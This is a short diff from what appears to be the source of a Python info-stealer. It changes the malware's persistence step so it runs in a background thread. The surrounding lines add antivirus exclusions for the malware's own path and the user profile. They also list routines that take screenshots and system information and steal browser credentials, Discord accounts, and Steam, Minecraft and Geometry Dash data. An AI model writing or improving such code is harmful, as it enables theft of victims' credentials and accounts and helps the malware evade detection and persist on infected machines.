@@ -1031,7 +1031,8 @@ exclusion(copypath)
 exclusion(os.getenv('userprofile'))
 
 kill()
-persistence(copypath)
+thread = threading.Thread(target=persistence, args=(copypath,))
+thread.start()
 funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
 # systeminfo()
 # screenshot()
